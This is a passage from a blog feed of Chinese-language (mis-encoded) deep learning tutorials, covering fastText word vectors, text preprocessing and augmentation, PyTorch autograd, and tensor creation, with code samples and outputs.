class="hljs-number">0.31821433</span>, -<span class="hljs-number">0.02154824</span>, -<span class="hljs-number">0.03422537</span>, -<span class="hljs-number">0.13752697</span>,<br>        <span class="hljs-number">0.28236884</span>,  <span class="hljs-number">0.47459602</span>, -<span class="hljs-number">0.1452173</span> ,  <span class="hljs-number">0.08719557</span>,  <span class="hljs-number">0.11245055</span>,<br>       -<span class="hljs-number">0.01942564</span>, -<span class="hljs-number">0.38417512</span>, -<span class="hljs-number">0.10941568</span>,  <span class="hljs-number">0.04246465</span>, -<span class="hljs-number">0.11036458</span>,<br>        <span class="hljs-number">0.2774673</span> ,  <span class="hljs-number">0.20110597</span>,  <span class="hljs-number">0.3259078</span> , -<span class="hljs-number">0.12203481</span>,  <span class="hljs-number">0.12826309</span>,<br>       -<span class="hljs-number">0.11036057</span>,  <span class="hljs-number">0.39044794</span>, -<span class="hljs-number">0.04462426</span>, -<span class="hljs-number">0.02714067</span>,  <span class="hljs-number">0.11053375</span>,<br>       -<span class="hljs-number">0.15136002</span>,  <span class="hljs-number">0.22139746</span>,  <span class="hljs-number">0.24734512</span>,  <span class="hljs-number">0.06377611</span>,  <span class="hljs-number">0.02416253</span>,<br>        <span class="hljs-number">0.17551999</span>, -<span class="hljs-number">0.23311079</span>,  <span class="hljs-number">0.06661322</span>,  <span class="hljs-number">0.32424128</span>,  <span class="hljs-number">0.2101823</span> ,<br>        <span class="hljs-number">0.25691697</span>,  <span class="hljs-number">0.25832957</span>,  <span class="hljs-number">0.1729201</span> ,  <span class="hljs-number">0.13627136</span>,  <span class="hljs-number">0.02371691</span>,<br>       -<span class="hljs-number">0.43661168</span>, -<span class="hljs-number">0.04388802</span>, -<span class="hljs-number">0.045301</span>  , -<span class="hljs-number">0.00119099</span>, -<span class="hljs-number">0.10205071</span>,<br>        <span class="hljs-number">0.18704088</span>, -<span class="hljs-number">0.2600936</span> ,  <span class="hljs-number">0.2387853</span> , -<span class="hljs-number">0.29954398</span>,  <span class="hljs-number">0.08725815</span>,<br>       -<span class="hljs-number">0.23276895</span>,  <span class="hljs-number">0.00449505</span>, -<span class="hljs-number">0.19258054</span>,  <span class="hljs-number">0.05162204</span>, -<span class="hljs-number">0.06285881</span>,<br>       -<span class="hljs-number">0.08242426</span>,  <span class="hljs-number">0.25470343</span>,  <span class="hljs-number">0.03506103</span>, -<span class="hljs-number">0.18733846</span>, -<span class="hljs-number">0.11046141</span>,<br>        <span class="hljs-number">0.05378657</span>,  <span class="hljs-number">0.21005692</span>,  <span class="hljs-number">0.14785953</span>,  <span class="hljs-number">0.24190894</span>,  <span class="hljs-number">0.01004618</span>,<br>       -<span class="hljs-number">0.1438988</span> ,  <span class="hljs-number">0.04277115</span>,  <span class="hljs-number">0.27179587</span>, -<span class="hljs-number">0.04454158</span>,  <span class="hljs-number">0.11442478</span>,<br>        <span class="hljs-number">0.09336581</span>, -<span class="hljs-number">0.02072855</span>,  <span class="hljs-number">0.1449741</span> , -<span class="hljs-number">0.05423071</span>, -<span class="hljs-number">0.02627472</span>,<br>        <span class="hljs-number">0.0190267</span> , -<span class="hljs-number">0.03677283</span>, -<span class="hljs-number">0.3188731</span> ,  <span class="hljs-number">0.29706222</span>,  <span class="hljs-number">0.3178355</span> ,<br>       -<span class="hljs-number">0.18600275</span>,  <span class="hljs-number">0.17816757</span>, -<span class="hljs-number">0.12264849</span>, -<span class="hljs-number">0.08815578</span>,  <span class="hljs-number">0.04992864</span>,<br>       -<span class="hljs-number">0.07476765</span>,  <span class="hljs-number">0.2927304</span> ,  <span class="hljs-number">0.29114792</span>,  <span class="hljs-number">0.2975045</span> ,  <span class="hljs-number">0.02667597</span>,<br>       -<span class="hljs-number">0.41576225</span>,  <span class="hljs-number">0.05530886</span>, -<span class="hljs-number">0.01657987</span>,  <span class="hljs-number">0.17934221</span>,  <span class="hljs-number">0.09024961</span>],<br>      dtype=float32)<br></code></pre></td></tr></table></figure><h3 id="æ¨¡å‹è¶…å‚æ•°è®¾å®š"><a href="#æ¨¡å‹è¶…å‚æ•°è®¾å®š" class="headerlink" title="æ¨¡å‹è¶…å‚æ•°è®¾å®š"></a>æ¨¡å‹è¶…å‚æ•°è®¾å®š</h3><ol><li>è®­ç»ƒæ¨¡å¼ï¼šæ— ç›‘ç£è®­ç»ƒåˆ†ä¸ºâ€™skipgramâ€™å’Œâ€™chowâ€™ï¼Œé»˜è®¤ä¸ºå‰è€…</li><li>è¯åµŒå…¥ç»´åº¦dimï¼šé»˜è®¤ä¸º100</li><li>æ•°æ®å¾ªç¯æ¬¡æ•°epochï¼šé»˜è®¤ä¸º5</li><li>å­¦ä¹ ç‡lrï¼šé»˜è®¤ä¸º0.05</li><li>çº¿ç¨‹æ•°threadï¼šé»˜è®¤ä¸º12ä¸ªçº¿ç¨‹ï¼Œå»ºè®®ä¸CPUæ ¸æ•°ç›¸åŒ</li></ol><h3 id="æ¨¡å‹æ•ˆæœæ£€éªŒ"><a href="#æ¨¡å‹æ•ˆæœæ£€éªŒ" class="headerlink" title="æ¨¡å‹æ•ˆæœæ£€éªŒ"></a>æ¨¡å‹æ•ˆæœæ£€éªŒ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>model.get_nearest_neighbors(<span class="hljs-string">&#x27;sports&#x27;</span>)<br><br>[(<span class="hljs-number">0.8495004773139954</span>, <span class="hljs-string">&#x27;sport&#x27;</span>), (<span class="hljs-number">0.8420268893241882</span>, <span class="hljs-string">&#x27;sporting&#x27;</span>), (<span class="hljs-number">0.80378657579422</span>, <span class="hljs-string">&#x27;sportsnet&#x27;</span>), (<span class="hljs-number">0.8021653294563293</span>, <span class="hljs-string">&#x27;sportsplex&#x27;</span>), (<span class="hljs-number">0.7963152527809143</span>, <span class="hljs-string">&#x27;sportsground&#x27;</span>), (<span class="hljs-number">0.7816479802131653</span>, <span class="hljs-string">&#x27;sportswomen&#x27;</span>), (<span class="hljs-number">0.7815326452255249</span>, <span class="hljs-string">&#x27;sportsman&#x27;</span>), (<span class="hljs-number">0.7743322253227234</span>, <span class="hljs-string">&#x27;sportscars&#x27;</span>), (<span class="hljs-number">0.7705729007720947</span>, <span class="hljs-string">&#x27;sportscar&#x27;</span>), (<span class="hljs-number">0.7693472504615784</span>, <span class="hljs-string">&#x27;athletics&#x27;</span>)]<br></code></pre></td></tr></table></figure><h3 id="æ¨¡å‹çš„ä¿å­˜ä¸é‡åŠ è½½"><a href="#æ¨¡å‹çš„ä¿å­˜ä¸é‡åŠ è½½" class="headerlink" title="æ¨¡å‹çš„ä¿å­˜ä¸é‡åŠ è½½"></a>æ¨¡å‹çš„ä¿å­˜ä¸é‡åŠ è½½</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>model.save_model(<span class="hljs-string">&quot;fil9.bin&quot;</span>)<br><br><span class="hljs-comment"># load</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>model = fasttext.load_model(<span class="hljs-string">&quot;fil9.bin&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="3-æ–‡æœ¬æ•°æ®åˆ†æ"><a href="#3-æ–‡æœ¬æ•°æ®åˆ†æ" class="headerlink" title="3.æ–‡æœ¬æ•°æ®åˆ†æ"></a>3.æ–‡æœ¬æ•°æ®åˆ†æ</h1><p>æ–‡æœ¬æ•°æ®åˆ†æçš„ä½œç”¨ï¼šæ–‡æœ¬æ•°æ®åˆ†æèƒ½å¤Ÿæœ‰æ•ˆå¸®åŠ©æˆ‘ä»¬ç†è§£æ•°æ®è¯­æ–™ï¼Œå¿«é€Ÿæ£€æŸ¥å‡ºè¯­æ–™å¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼Œå¹¶æŒ‡å¯¼ä¹‹åæ¨¡å‹è®­ç»ƒè¿‡ç¨‹ä¸­ä¸€äº›è¶…å‚æ•°çš„é€‰æ‹©ã€‚</p><p>å¸¸ç”¨çš„å‡ ç§æ–‡æœ¬æ•°æ®åˆ†ææ–¹æ³•ï¼š</p><ul><li>æ ‡ç­¾æ•°é‡åˆ†å¸ƒ</li><li>å¥å­é•¿åº¦åˆ†å¸ƒ</li><li>è¯é¢‘ç»Ÿè®¡ä¸å…³é”®è¯è¯äº‘</li></ul><h1 id="4-æ–‡æœ¬ç‰¹å¾å¤„ç†"><a href="#4-æ–‡æœ¬ç‰¹å¾å¤„ç†" class="headerlink" title="4.æ–‡æœ¬ç‰¹å¾å¤„ç†"></a>4.æ–‡æœ¬ç‰¹å¾å¤„ç†</h1><p>æ–‡æœ¬ç‰¹å¾å¤„ç†çš„ä½œç”¨ï¼šä¸ºè¯­æ–™æ·»åŠ å…·æœ‰æ™®é€‚æ€§çš„æ–‡æœ¬ç‰¹å¾ï¼Œå¦‚n-gramç‰¹å¾ï¼Œä»¥åŠå¯¹åŠ å…¥ç‰¹å¾ä¹‹åçš„æ–‡æœ¬è¯­æ–™è¿›è¡Œå¿…è¦çš„å¤„ç†ï¼Œå¦‚é•¿åº¦è§„èŒƒã€‚è¿™äº›ç‰¹å¾å¤„ç†å·¥ä½œèƒ½å¤Ÿæœ‰æ•ˆçš„å°†é‡è¦çš„æ–‡æœ¬ç‰¹å¾åŠ å…¥æ¨¡å‹è®­ç»ƒå½“ä¸­ï¼Œå¢å¼ºæ¨¡å‹è¯„ä¼°æŒ‡æ ‡ã€‚</p><ul><li>n-gramç‰¹å¾ï¼šç»™å®šä¸€æ®µæ–‡æœ¬åºåˆ—ï¼Œå…¶ä¸­nä¸ªè¯æˆ–å­—çš„ç›¸é‚»å…±ç°ç‰¹å¾å³n-gramç‰¹å¾ã€‚</li></ul><p>å¸¸ç”¨çš„n-gramç‰¹å¾æ˜¯bi-gramå’Œtri-gramï¼Œå¯¹åº”nä¸º2å’Œ3</p><ul><li>æ–‡æœ¬é•¿åº¦è§„èŒƒï¼šä¸€èˆ¬æ¨¡å‹çš„è¾“å…¥éœ€è¦ç­‰å°ºå¯¸å¤§å°çš„çŸ©é˜µï¼Œå› æ­¤åœ¨è¿›å…¥æ¨¡å‹å‰éœ€è¦å¯¹æ¯æ¡æ–‡æœ¬æ•°å€¼æ˜ å°„åçš„é•¿åº¦è¿›è¡Œè§„èŒƒï¼Œæ­¤æ—¶å°†æ ¹æ®å¥å­é•¿åº¦åˆ†å¸ƒåˆ†æå‡ºè¦†ç›–ç»å¤§å¤šæ•°æ–‡æœ¬çš„åˆç†é•¿åº¦ï¼Œå¯¹è¶…é•¿æ–‡æœ¬è¿›è¡Œæˆªæ–­ï¼Œå¯¹ä¸è¶³æ–‡æœ¬è¿›è¡Œè¡¥é½ã€‚</li></ul><h1 id="5-æ–‡æœ¬æ•°æ®å¢å¼º"><a href="#5-æ–‡æœ¬æ•°æ®å¢å¼º" class="headerlink" title="5.æ–‡æœ¬æ•°æ®å¢å¼º"></a>5.æ–‡æœ¬æ•°æ®å¢å¼º</h1><p>å…³äºå›è¯‘æ•°æ®å¢å¼ºæ³•ï¼šå›è¯‘æ•°æ®å¢å¼ºæŒ‡å°†æ–‡æœ¬æ•°æ®ç¿»è¯‘æˆå¦å¤–ä¸€ç§è¯­è¨€ï¼Œä¹‹åå†ç¿»è¯‘å›åŸè¯­è¨€ï¼Œå°±å¾—åˆ°äº†åŒæ ‡ç­¾çš„æ–°è¯­æ–™ï¼Œå°†è¿™ä¸ªæ–°è¯­æ–™åŠ å…¥åŸæ•°æ®é›†ä¸­å³å¯è®¤ä¸ºæ˜¯æ•°æ®å¢å¼ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> googletrans <span class="hljs-keyword">import</span> Translator<br>translator = Translator()<br>translations_ko = translator.translate([sample1, sample2, sample3], dest = <span class="hljs-string">&#x27;ko&#x27;</span>)<br>ko_res = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x : x.text, translations_ko))<br>translations_cn = translator.translate(ko_res, dest = <span class="hljs-string">&#x27;zh-cn&#x27;</span>)<br>cn_res = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x : x.text, translations_cn))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Autograd</title>
    <link href="/2024/02/11/Autograd/"/>
    <url>/2024/02/11/Autograd/</url>
    
    <content type="html"><![CDATA[<h1 id="PyTorchä¸­çš„autograd"><a href="#PyTorchä¸­çš„autograd" class="headerlink" title="PyTorchä¸­çš„autograd"></a>PyTorchä¸­çš„autograd</h1><p>åœ¨æ•´ä¸ªPyTorchæ¡†æ¶ä¸­ï¼Œæ‰€æœ‰çš„ç¥ç»ç½‘ç»œéƒ½æ˜¯ä¸€ä¸ªautograd packageï¼ˆè‡ªåŠ¨æ±‚å¯¼å·¥å…·åŒ…ï¼‰</p><p>autograd packageæä¾›äº†ä¸€ä¸ªå¯¹Tensorä¸Šçš„æ‰€æœ‰æ“ä½œè¿›è¡Œè‡ªåŠ¨å¾®åˆ†çš„åŠŸèƒ½</p><h2 id="å…³äºtorch-Tensor"><a href="#å…³äºtorch-Tensor" class="headerlink" title="å…³äºtorch.Tensor"></a>å…³äºtorch.Tensor</h2><ul><li><p>torch.Tensoræ˜¯æ•´ä¸ªpackageä¸­çš„æ ¸å¿ƒç±»ï¼Œå¦‚æœå°†å±æ€§ <em>.requires_grad</em> è®¾ç½®ä¸º trueï¼Œä»–å°†è¿½è¸ªè¿™ä¸ªç±»ä¸Šçš„æ‰€æœ‰æ“ä½œï¼Œå½“ä»£ç è¦è¿›è¡Œåå‘ä¼ æ’­æ—¶ï¼Œç›´æ¥è°ƒç”¨ <em>.backward()</em> å°±å¯ä»¥è‡ªåŠ¨è®¡ç®—æ‰€æœ‰çš„æ¢¯åº¦ï¼Œåœ¨è¿™ä¸ªTensorä¸Šçš„æ‰€æœ‰æ¢¯åº¦å°†è¢«ç´¯åŠ è¿›å±æ€§ <em>.grad</em> ä¸­ã€‚</p></li><li><p>å¦‚æœæƒ³ç»ˆæ­¢ä¸€ä¸ªTensoråœ¨è®¡ç®—å›¾ä¸­çš„è¿½è¸ªå›æº¯ï¼Œåªéœ€è¦æ‰§è¡Œ <em>.detach()</em> å°±å¯ä»¥å°†è¯¥Tensorä»è®¡ç®—å›¾ä¸­æ’¤ä¸‹ï¼Œåœ¨æœªæ¥çš„å›æº¯è®¡ç®—ä¸­ä¹Ÿä¸ä¼šåœ¨è®¡ç®—è¯¥Tensorã€‚</p></li><li><p>é™¤äº† <em>.detach()</em> å¦‚æœæƒ³ç»ˆæ­¢å¯¹è®¡ç®—å›¾çš„å›æº¯ï¼Œä¹Ÿå°±æ˜¯ä¸å†è¿›è¡Œæ–¹å‘ä¼ æ’­æ±‚å¯¼çš„è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨ä»£ç å—çš„å½¢å¼ <em>with torch.no_grad():</em> ï¼Œè¿™ç§æ“ä½œéå¸¸é€‚ç”¨äºå¯¹æ¨¡å‹è¿›è¡Œé¢„æµ‹çš„æ—¶å€™ï¼Œå› ä¸ºé¢„æµ‹é˜¶æ®µä¸éœ€è¦å¯¹æ¢¯åº¦è¿›è¡Œè®¡ç®—ã€‚</p></li></ul><h2 id="å…³äºtorch-Function"><a href="#å…³äºtorch-Function" class="headerlink" title="å…³äºtorch.Function"></a>å…³äºtorch.Function</h2><ul><li><p>Functionç±»æ˜¯å’ŒTensorç±»åŒç­‰é‡è¦çš„ä¸€ä¸ªæ ¸å¿ƒç±»,å®ƒå’ŒTensorå…±åŒæ„æˆä¸€ä¸ªå®Œæ•´çš„ç±»</p></li><li><p>æ¯ä¸€ä¸ªTensoræ‹¥æœ‰ä¸€ä¸ª <em>grad.fn</em> å±æ€§,ä»£è¡¨å¼•ç”¨äº†å“ªä¸ªå…·ä½“çš„Functionåˆ›å»ºäº†è¯¥Tensor</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> torch<br><br>x1 = torch.ones(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>)<br>x2 = torch.ones(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, requires_grad=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(x1, <span class="hljs-string">&#x27;\n&#x27;</span>, x2)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">tensor([[1., 1., 1.],</span><br><span class="hljs-string">        [1., 1., 1.],</span><br><span class="hljs-string">        [1., 1., 1.]]) </span><br><span class="hljs-string"> tensor([[1., 1.],</span><br><span class="hljs-string">        [1., 1.]], requires_grad=True)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>y = x2 + <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-built_in">print</span>(x1.grad_fn, <span class="hljs-string">&#x27;\n&#x27;</span>, y.grad_fn)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">tensor([[3., 3.],</span><br><span class="hljs-string">        [3., 3.]], grad_fn=&lt;AddBackward0&gt;)</span><br><span class="hljs-string">None </span><br><span class="hljs-string"> &lt;AddBackward0 object at 0x0000020CC93A7F70&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>ç”¨æˆ·è‡ªå®šä¹‰çš„Tensor,å…¶grad_fn&#x3D;None.</p></blockquote><p>ä¸€äº›æ›´å¤æ‚çš„æ“ä½œ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">z = y * y * <span class="hljs-number">3</span><br>out = z.mean()<br><span class="hljs-built_in">print</span>(z, out)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">tensor([[27., 27.],</span><br><span class="hljs-string">        [27., 27.]], grad_fn=&lt;MulBackward0&gt;) tensor(27., grad_fn=&lt;MeanBackward0&gt;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p><em>.mean()</em> æ–¹æ³•è¡¨ç¤ºæ±‚å‡å€¼</p></blockquote><p>ä½¿ç”¨inplaceæ“ä½œç¬¦å¯ä»¥æ”¹å˜Tensorçš„ <em>requires_grad</em> å±æ€§:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a = torch.ones(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(a.requires_grad)<br>a.requires_grad_(<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(a.requires_grad)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">False</span><br><span class="hljs-string">True</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="å…³äºæ¢¯åº¦Gradients"><a href="#å…³äºæ¢¯åº¦Gradients" class="headerlink" title="å…³äºæ¢¯åº¦Gradients"></a>å…³äºæ¢¯åº¦Gradients</h2><p>åœ¨PyTorchä¸­,åå‘ä¼ æ’­æ˜¯ä¾é  <em>.backward()</em> å®ç°çš„,ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ä¾‹å­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">out.backward()<br><span class="hljs-built_in">print</span>(x2.grad)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">tensor([[4.5000, 4.5000],</span><br><span class="hljs-string">        [4.5000, 4.5000]])</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬é¦–å…ˆè¦å¼„æ¸… $out$ æ˜¯å¦‚ä½•å¾—åˆ°çš„.</p><p>æˆ‘ä»¬æŠŠ $out$ è§†ä¸ºä¸€ä¸ªå¤šå…ƒå‡½æ•°,å°† $x$ è§†ä¸ºä¸€ä¸ªå¤šå…ƒå˜é‡,é‚£ä¹ˆ:<br>$$out &#x3D; \frac{3(x+2)^{2}}{4}$$</p><p>å¯¹ $out$ æ±‚ $x$ çš„å¯¼æ•°:<br>$$outâ€™ &#x3D; \frac{3(x+2)}{2}$$</p><p>å°†xä»£å…¥,ä¾¿å¾—åˆ°ç»“æœ.</p><ul><li>å…³äºè‡ªåŠ¨æ±‚å¯¼çš„å±æ€§è®¾ç½®:å¯ä»¥é€šè¿‡è®¾ç½® <em>.requires_grad&#x3D;True</em> æ¥æ‰§è¡Œè‡ªåŠ¨æ±‚å¯¼,ä¹Ÿå¯ä»¥é€šè¿‡ä»£ç å—çš„é™åˆ¶æ¥åœæ­¢è‡ªåŠ¨æ±‚å¯¼.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(x.requires_grad)<br><span class="hljs-built_in">print</span>((x ** <span class="hljs-number">2</span>).equires_grad)<br><br><span class="hljs-keyword">with</span> torch.no_grad():<br>    <span class="hljs-built_in">print</span>((x ** <span class="hljs-number">2</span>).requires_grad)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">True</span><br><span class="hljs-string">True</span><br><span class="hljs-string">False</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>å¯ä»¥é€šè¿‡ <em>.detach()</em> è·å¾—ä¸€ä¸ªæ–°çš„Tensor,æ‹¥æœ‰ç›¸åŒå†…å®¹ä½†ä¸éœ€è¦è‡ªåŠ¨æ±‚å¯¼.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(x.requires_grad)<br>y = x.detach()<br><span class="hljs-built_in">print</span>(y,requires_grad)<br><span class="hljs-built_in">print</span>(x.eq(y).<span class="hljs-built_in">all</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">True</span><br><span class="hljs-string">False</span><br><span class="hljs-string">tensor(True)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PytorchåŸºæœ¬è¯­æ³•</title>
    <link href="/2024/02/09/PyTorch%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <url>/2024/02/09/PyTorch%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="Pytorchçš„åŸºæœ¬æ“ä½œ"><a href="#Pytorchçš„åŸºæœ¬æ“ä½œ" class="headerlink" title="Pytorchçš„åŸºæœ¬æ“ä½œ"></a>Pytorchçš„åŸºæœ¬æ“ä½œ</h1><h2 id="å¼ é‡çš„åˆ›å»º"><a href="#å¼ é‡çš„åˆ›å»º" class="headerlink" title="å¼ é‡çš„åˆ›å»º"></a>å¼ é‡çš„åˆ›å»º</h2><p>Tensorå¼ é‡ï¼šå¼ é‡çš„æ¦‚å¿µç±»ä¼¼äºNumpyä¸­çš„ndarrayæ•°æ®ç»“æ„ï¼Œæœ€å¤§çš„åŒºåˆ«åœ¨äºTensorå¯ä»¥åˆ©ç”¨GPUçš„åŠ é€ŸåŠŸèƒ½ã€‚</p><p>åœ¨ä½¿ç”¨Pytorchæ—¶ï¼Œéœ€è¦å…ˆå¼•å…¥æ¨¡å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> torch<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯Pytorchä¸­åˆ›å»ºå¼ é‡çš„åŸºæœ¬è¯­æ³•ï¼š</p><ol><li>torch.tensor æ ¹æ®æŒ‡å®šæ•°æ®åˆ›å»ºå¼ é‡</li><li>torch.Tensor æ ¹æ®å½¢çŠ¶åˆ›å»ºå¼ é‡, å…¶ä¹Ÿå¯ç”¨æ¥åˆ›å»ºæŒ‡å®šæ•°æ®çš„å¼ é‡</li><li>torch.IntTensorã€torch.FloatTensorã€torch.DoubleTensor åˆ›å»ºæŒ‡å®šç±»å‹çš„å¼ é‡</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># 1. æ ¹æ®å·²æœ‰æ•°æ®åˆ›å»ºå¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test01</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»ºå¼ é‡æ ‡é‡</span><br>    data = torch.tensor(<span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. numpy æ•°ç»„, ç”±äº data ä¸º float64, ä¸‹é¢ä»£ç ä¹Ÿä½¿ç”¨è¯¥ç±»å‹</span><br>    data = np.random.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    data = torch.tensor(data)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 3. åˆ—è¡¨, ä¸‹é¢ä»£ç ä½¿ç”¨é»˜è®¤å…ƒç´ ç±»å‹ float32</span><br>    data = [[<span class="hljs-number">10.</span>, <span class="hljs-number">20.</span>, <span class="hljs-number">30.</span>], [<span class="hljs-number">40.</span>, <span class="hljs-number">50.</span>, <span class="hljs-number">60.</span>]]<br>    data = torch.tensor(data)<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment"># 2. åˆ›å»ºæŒ‡å®šå½¢çŠ¶çš„å¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test02</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»º2è¡Œ3åˆ—çš„å¼ é‡, é»˜è®¤ dtype ä¸º float32</span><br>    data = torch.Tensor(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. æ³¨æ„: å¦‚æœä¼ é€’åˆ—è¡¨, 